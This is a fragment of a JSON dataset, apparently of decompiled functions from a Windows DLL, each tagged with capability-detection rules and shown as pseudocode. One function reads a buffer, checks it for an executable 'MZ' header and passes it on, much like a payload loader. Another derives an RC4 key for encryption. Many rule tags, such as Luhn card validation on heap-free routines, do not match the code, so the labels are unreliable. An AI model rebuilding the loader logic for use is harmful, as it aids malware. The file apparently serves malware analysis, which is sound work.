        "decompiled_code": "\nuint64_t fcn.18000c980(ulong noname_0, uint32_t *arg2, ulong noname_2, uint32_t *arg4)\n\n{\n    uint8_t uVar1;\n    uint64_t uVar2;\n    \n    fcn.18000ad58(*arg2);\n    uVar1 = *0x18001f010 & 0x3f;\n    uVar2 = *0x18001f010 ^ *0x180020e18;\n    fcn.18000adac(*arg4);\n    return uVar2 >> uVar1 | uVar2 << 0x40 - uVar1;\n}\n",
        "token_count": 144
    },
    "18000f6d": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid fcn.18000f6d0(ulong arg1)\n\n{\n    // WARNING: Could not recover jumptable at 0x00018000f6f0. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(*((arg1 >> 6) * 8 + 0x1800205b0) + (arg1 & 0x3f) * 0x48);\n    return;\n}\n",
        "token_count": 107
    },
    "18000f6f": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid fcn.18000f6f8(ulong arg1)\n\n{\n    // WARNING: Could not recover jumptable at 0x00018000f718. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(*((arg1 >> 6) * 8 + 0x1800205b0) + (arg1 & 0x3f) * 0x48);\n    return;\n}\n",
        "token_count": 106
    },
    "180011df": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nint64_t fcn.180011df8(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    uint *puVar5;\n    int64_t iStackX32;\n    \n    iVar4 = fcn.18000f7dc(arg1 & 0xffffffff);\n    if (iVar4 == -1) {\n        puVar5 = fcn.18000528c();\n        *puVar5 = 9;\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(iVar4, arg2, &iStackX32, arg3);\n        if (iVar2 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            fcn.18000521c(uVar3);\n        }\n        else if (iStackX32 != -1) {\n            puVar1 = *((arg1 >> 6) * 8 + 0x1800205b0) + 0x38 + (arg1 & 0x3f) * 0x48;\n            *puVar1 = *puVar1 & 0xfd;\n            return iStackX32;\n        }\n    }\n    return -1;\n}\n",
        "token_count": 293
    },
    "18000101": {
        "rules": [
            "hash data using SHA1/569f5a119d93492db8a59d47f1ccb3c0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: hKey\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180001010(ulong *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uchar auStack152 [32];\n    ulong uStack120;\n    uint *puStack112;\n    uint uStack104;\n    ulong uStack88;\n    ulong uStack80;\n    ulong uStack72;\n    uint auStack64 [2];\n    uint64_t phProv;\n    ulong hBaseData;\n    ulong hKey;\n    ulong var_18h;\n    ulong var_10h;\n    \n    phProv = *0x18001f010 ^ auStack152;\n    uStack88 = 0;\n    uStack80 = 0;\n    uStack72 = 0;\n    uStack120 = uStack120 & 0xffffffff00000000;\n    auStack64[0] = arg2;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextW)\n                      (&uStack88, 0, L\"Microsoft Enhanced Cryptographic Provider v1.0\", 1);\n    if (iVar1 == 0) {\n        uStack120 = CONCAT44(uStack120._4_4_, 8);\n        iVar1 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextW)\n                          (&uStack88, 0, L\"Microsoft Enhanced Cryptographic Provider v1.0\", 1);\n        if (iVar1 == 0) goto code_r0x000180001158;\n    }\n    uStack120 = &uStack80;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_CryptCreateHash)(uStack88, 0x8004, 0, 0);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_CryptHashData)(uStack80, arg3, arg4, 0);\n        if (iVar1 != 0) {\n            uStack120 = &uStack72;\n            iVar1 = (*_sym.imp.ADVAPI32.dll_CryptDeriveKey)(uStack88, 0x6801, uStack80, 0);\n            if (iVar1 != 0) {\n                puStack112 = auStack64;\n                uStack120 = arg1;\n                uStack104 = arg2;\n                iVar1 = (*_sym.imp.ADVAPI32.dll_CryptEncrypt)(uStack72, 0, 1);\n                if (iVar1 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_CryptDestroyKey)(uStack72);\n                    (*_sym.imp.ADVAPI32.dll_CryptDestroyHash)(uStack80);\n                    (*_sym.imp.ADVAPI32.dll_CryptReleaseContext)(uStack88, 0);\n                    goto code_r0x000180001158;\n                }\n                (*_sym.imp.ADVAPI32.dll_CryptDestroyKey)();\n            }\n        }\n        (*_sym.imp.ADVAPI32.dll_CryptDestroyHash)(uStack80);\n    }\n    (*_sym.imp.ADVAPI32.dll_CryptReleaseContext)(uStack88, 0);\ncode_r0x000180001158:\n    fcn.1800030c0(phProv ^ auStack152);\n    return;\n}\n",
        "token_count": 757
    },
    "18000138": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.180001380(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    ulong *puVar2;\n    \n    puVar2 = fcn.180001370();\n    iVar1 = fcn.1800069b0(*puVar2, arg1, arg2, arg3);\n    if (iVar1 < 0) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 106
    },
    "180001c3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_bp_20h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180001c30(ulong param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t arg_60h;\n    char *arg1;\n    ulong uVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    uchar auStackY104 [32];\n    uint in_stack_ffffffffffffffbc;\n    uint in_stack_ffffffffffffffc4;\n    ulong var_30h;\n    uint uVar6;\n    uint uVar7;\n    ulong var_bp_20h;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint uVar10;\n    ulong var_10h;\n    ulong in_stack_fffffffffffffff0;\n    \n    arg_60h = *0x18001f010 ^ auStackY104;\n    uVar5 = 0;\n    *0x18001fc50 = *0x180020f80;\n    uVar6 = 0x12234562;\n    uVar7 = 0x827183a8;\n    *0x18001fc54 = *0x180020f78;\n    uVar10 = 0;\n    uVar8 = 0;\n    *0x18001fa34 = ZEXT1216(ZEXT412(0x38d2744e));\n    *0x18001fa24 = CONCAT412(0x827183a8, CONCAT48(0x12234562, 0x1adb9813c3baa654));\n    *0x18001fc4c = 0xe8afd28;\n    iVar1 = fcn.180002d30(param_1, 0x180020f80, 0x1488, &stack0xffffffffffffffe4, CONCAT44(in_stack_ffffffffffffffbc, 4)\n                          , CONCAT44(in_stack_ffffffffffffffc4, 1), 0x1adb9813c3baa654, 0x827183a812234562, \n                          CONCAT44(var_bp_20h._4_4_, 0x38d2744e), 0, arg_60h, in_stack_fffffffffffffff0);\n    if (iVar1 == 4) {\n        *0x18001fa24 = CONCAT124(SUB1612(ZEXT816(0) >> 0x20, 0), uVar10);\n        *0x18001fa34 = ZEXT816(0);\n        iVar1 = fcn.180002d30(param_1, 0, 0, &stack0xffffffffffffffe0, CONCAT44(in_stack_ffffffffffffffbc, 4), \n                              CONCAT44(in_stack_ffffffffffffffc4, 1), 0x1adb9813c3baa654, CONCAT44(uVar7, uVar6), \n                              CONCAT44(var_bp_20h._4_4_, 0x38d2744e), CONCAT44(uVar10, uVar8), arg_60h, \n                              in_stack_fffffffffffffff0);\n        if (iVar1 == 4) {\n            if (uVar8 - 1 < 0xa00000) {\n                uVar3 = 0x40;\n                uVar9 = uVar8;\n                arg1 = (*_sym.imp.KERNEL32.dll_LocalAlloc)();\n                if (arg1 == NULL) {\n                    (*_sym.imp.USER32.dll_PostMessageW)(*0x180020e60, 0x5453, 0, 0);\n                }\n                else {\n                    if (uVar8 != 0) {\n                        do {\n                            uVar2 = uVar8 - uVar5;\n                            uVar4 = 0xffff;\n                            if (uVar2 < 0xffff) {\n                                uVar4 = uVar2;\n                            }\n                            uVar2 = fcn.180002d30(uVar3, 0, 0, arg1 + uVar5, CONCAT44(in_stack_ffffffffffffffbc, uVar4)\n                                                  , CONCAT44(in_stack_ffffffffffffffc4, 1), 0x1adb9813c3baa654, \n                                                  CONCAT44(uVar7, uVar6), CONCAT44(var_bp_20h._4_4_, 0x38d2744e), \n                                                  CONCAT44(uVar10, uVar9), arg_60h, in_stack_fffffffffffffff0);\n                            if (uVar2 != uVar4) {\n                                uVar3 = 0x5453;\n                                goto code_r0x000180001e45;\n                            }\n                            uVar4 = uVar5 + uVar4;\n                            uVar5 = uVar4;\n                        } while (uVar4 < uVar8);\n                        if (((uVar8 != 0) && (*arg1 == 'M')) && (arg1[1] == 'Z')) {\n                            fcn.180002050(arg1);\n                            (*_sym.imp.KERNEL32.dll_Sleep)(60000);\n                            goto code_r0x000180001e64;\n                        }\n                    }\n                    uVar3 = 0x546d;\n                    *0x180020f74 = (*0x180020f74 + 1) % 5;\ncode_r0x000180001e45:\n                    (*_sym.imp.USER32.dll_PostMessageW)(*0x180020e60, uVar3, 0, 0);\n                }\n            }\n            else {\n                (*_sym.imp.USER32.dll_PostMessageW)(*0x180020e60, 0x5453, 0, 0);\n            }\n        }\n        else {\n            (*_sym.imp.USER32.dll_PostMessageW)(*0x180020e60, 0x5453, 0, 0);\n        }\n    }\n    else {\n        *0x180020f74 = (*0x180020f74 + 1) % 5;\n        (*_sym.imp.USER32.dll_PostMessageW)(*0x180020e60, 0x546d, 0, 0);\n    }\ncode_r0x000180001e64:\n    fcn.1800030c0(arg_60h ^ auStackY104);\n    return;\n}\n",
        "token_count": 1397
    },
    "180008d7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180008d70(int64_t lpMem)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    \n    if ((lpMem != 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x180020df8, 0, lpMem),  iVar2 == 0)) {\n        puVar1 = fcn.18000528c();\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar4 = fcn.1800051d4(uVar3);\n        *puVar1 = uVar4;\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "180003e6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180003e68(void)\n\n{\n    ulong *puVar1;\n    ulong *arg1;\n    \n    arg1 = (*_sym.imp.KERNEL32.dll_InterlockedFlushSList)(0x180020270);\n    while (arg1 != NULL) {\n        puVar1 = *arg1;\n        fcn.180006a84(arg1);\n        arg1 = puVar1;\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "180003ea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180003ea0(void)\n\n{\n    int64_t *piVar1;\n    \n    for (piVar1 = 0x18001cfb8; piVar1 < 0x18001cfb8; piVar1 = piVar1 + 1) {\n        if (*piVar1 != 0) {\n            (**0x1800143f0)();\n        }\n    }\n    return;\n}\n",
        "token_count": 92
    },
    "180003ed": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180003edc(void)\n\n{\n    int64_t *piVar1;\n    \n    for (piVar1 = 0x18001cfc8; piVar1 < 0x18001cfc8; piVar1 = piVar1 + 1) {\n        if (*piVar1 != 0) {\n            (**0x1800143f0)();\n        }\n    }\n    return;\n}\n",
        "token_count": 92
    },
    "18000323": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar fcn.18000323c(void)\n\n{\n    fcn.180007c30(0);\n    fcn.180004650();\n    return 1;\n}\n",
        "token_count": 37
    },
    "1800046a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800046a8(void)\n\n{\n    uint64_t uVar1;\n    \n    uVar1 = *0x180020338;\n    while (uVar1 != 0) {\n        uVar1 = uVar1 - 1;\n        (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(uVar1 * 0x28 + 0x180020310);\n        *0x180020338 = *0x180020338 - 1;\n    }\n    return 1;\n}\n",
        "token_count": 111
    },
    "180008db": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180008db0(uint64_t arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    \n    if (arg1 < 0xffffffffffffffe1) {\n        if (arg1 == 0) {\n            arg1 = 1;\n        }\n        do {\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x180020df8, 0, arg1);\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar1 = fcn.18000d91c();\n        } while ((iVar1 != 0) && (iVar1 = fcn.18000c91c(arg1),  iVar1 != 0));\n    }\n    puVar3 = fcn.18000528c();\n    *puVar3 = 0xc;\n    return 0;\n}\n",
        "token_count": 199
    },
    "18000768": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18000768c(void)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    int64_t arg1;\n    int64_t iVar3;\n    \n    uVar2 = 0;\n    if (*0x180020518 == 0) {\n        fcn.18000c19c();\n        arg1 = fcn.18000c694();\n        if (arg1 == 0) {\n            uVar2 = 0xffffffff;\n        }\n        else {\n            iVar3 = fcn.1800074d0(arg1);\n            iVar1 = iVar3;\n            if (iVar3 == 0) {\n                uVar2 = 0xffffffff;\n                iVar3 = *0x180020518;\n                iVar1 = *0x180020530;\n            }\n            *0x180020530 = iVar1;\n            *0x180020518 = iVar3;\n            fcn.180008d70(0);\n        }\n        fcn.180008d70(arg1);\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 240
    },
    "180007a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180007a48(ulong arg1, ulong arg2)\n\n{\n    ulong uStackX8;\n    ulong uStackX16;\n    ulong var_20h_2;\n    ulong var_28h;\n    ulong var_20h;\n    ulong *var_18h;\n    ulong *var_bp_10h;\n    \n    var_18h = &uStackX8;\n    var_bp_10h = &uStackX16;\n    var_28h._0_4_ = 2;\n    var_20h._0_4_ = 2;\n    uStackX8 = arg1;\n    uStackX16 = arg2;\n    fcn.180007694(&var_20h_2, &var_20h, &var_18h, &var_28h);\n    return;\n}\n",
        "token_count": 192
    },
    "180007c3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar fcn.180007c30(void)\n\n{\n    fcn.18000883c();\n    return 1;\n}\n",
        "token_count": 27
    },
    "180008c5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180008c5c(int64_t arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    \n    if ((*arg2 != *0x180020570) && ((*0x18001f820 & *(arg1 + 0x3a8)) == 0)) {\n        iVar1 = fcn.18000d3c4(arg1);\n        *arg2 = iVar1;\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "180008c9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180008c90(int64_t arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    \n    if ((*arg2 != *0x180020db8) && ((*0x18001f820 & *(arg1 + 0x3a8)) == 0)) {\n        iVar1 = fcn.18000c1fc(arg1);\n        *arg2 = iVar1;\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "18000d4b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000d4b4(int64_t arg1)\n\n{\n    if (arg1 != 0) {\n        if (*(arg1 + 0x18) != *0x18001f848) {\n            fcn.180008d70(*(arg1 + 0x18));\n        }\n        if (*(arg1 + 0x20) != *0x18001f850) {\n            fcn.180008d70(*(arg1 + 0x20));\n        }\n        if (*(arg1 + 0x28) != *0x18001f858) {\n            fcn.180008d70(*(arg1 + 0x28));\n        }\n        if (*(arg1 + 0x30) != *0x18001f860) {\n            fcn.180008d70(*(arg1 + 0x30));\n        }\n        if (*(arg1 + 0x38) != *0x18001f868) {\n            fcn.180008d70(*(arg1 + 0x38));\n        }\n        if (*(arg1 + 0x40) != *0x18001f870) {\n            fcn.180008d70(*(arg1 + 0x40));\n        }\n        if (*(arg1 + 0x48) != *0x18001f878) {\n            fcn.180008d70(*(arg1 + 0x48));\n        }\n        if (*(arg1 + 0x68) != *0x18001f898) {\n            fcn.180008d70(*(arg1 + 0x68));\n        }\n        if (*(arg1 + 0x70) != *0x18001f8a0) {\n            fcn.180008d70(*(arg1 + 0x70));\n        }\n        if (*(arg1 + 0x78) != *0x18001f8a8) {\n            fcn.180008d70(*(arg1 + 0x78));\n        }\n        if (*(arg1 + 0x80) != *0x18001f8b0) {\n            fcn.180008d70(*(arg1 + 0x80));\n        }\n        if (*(arg1 + 0x88) != *0x18001f8b8) {\n            fcn.180008d70(*(arg1 + 0x88));\n        }\n        if (*(arg1 + 0x90) != *0x18001f8c0) {\n            fcn.180008d70(*(arg1 + 0x90));\n        }\n    }\n    return;\n}\n",
        "token_count": 564
    },
    "18000d5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000d5c0(int64_t *arg1)\n\n{\n    if (arg1 != NULL) {\n        if (*arg1 != *0x18001f830) {\n            fcn.180008d70(*arg1);\n        }\n        if (arg1[1] != *0x18001f838) {\n            fcn.180008d70(arg1[1]);\n        }\n        if (arg1[2] != *0x18001f840) {\n            fcn.180008d70(arg1[2]);\n        }\n        if (arg1[0xb] != *0x18001f888) {\n            fcn.180008d70(arg1[0xb]);\n        }\n        if (arg1[0xc] != *0x18001f890) {\n            fcn.180008d70(arg1[0xc]);\n        }\n    }\n    return;\n}\n",
        "token_count": 199
    },
    "18001254": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180012540(ulong param_1, ulong param_2, ulong param_3)\n\n{\n    fcn.180012560(param_1, param_2, param_3, 0x1b);\n    return;\n}\n",
        "token_count": 54
    },
    "180006c7": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint64_t fcn.180006c7c(uint64_t arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    \n    if (arg1 < 0xffffffffffffffe1) {\n        if (arg1 == 0) {\n            arg1 = 1;\n        }\n        do {\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x180020df8, 0, arg1);\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar1 = fcn.18000d91c();\n        } while ((iVar1 != 0) && (iVar1 = fcn.18000c91c(arg1),  iVar1 != 0));\n    }\n    puVar3 = fcn.18000528c();\n    *puVar3 = 0xc;\n    return 0;\n}\n",
        "token_count": 200
    },
    "1800070a": {
        "rules": [
            "parse PE header"
        ],
        "decompiled_code": "\nvoid fcn.1800070a8(ulong arg1)\n\n{\n    code *pcVar1;\n    int16_t *piVar2;\n    int32_t *piVar3;\n    uint auStackX16 [2];\n    int32_t aiStackX24 [2];\n    uchar auStackX32 [8];\n    uchar auStack56 [4];\n    uint uStack52;\n    uint auStack48 [2];\n    uint *puStack40;\n    int32_t *piStack32;\n    uchar *puStack24;\n    \n    aiStackX24[0] = 0;\n    auStackX16[0] = 2;\n    piVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    if ((((piVar2 != NULL) && (*piVar2 == 0x5a4d)) && (piVar3 = *(piVar2 + 0x1e) + piVar2,  *piVar3 == 0x4550)) &&\n       (((*(piVar3 + 6) == 0x20b && (0xe < piVar3[0x21])) && (piVar3[0x3e] != 0)))) {\n        fcn.180007034(arg1);\n    }\n    puStack40 = auStackX16;\n    auStackX32[0] = 0;\n    piStack32 = aiStackX24;\n    puStack24 = auStackX32;\n    uStack52 = 2;\n    auStack48[0] = 2;\n    fcn.180006e24(auStack56, auStack48, &puStack40, &uStack52);\n    if (aiStackX24[0] == 0) {\n        fcn.180006fe8(arg1);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 414
    }
}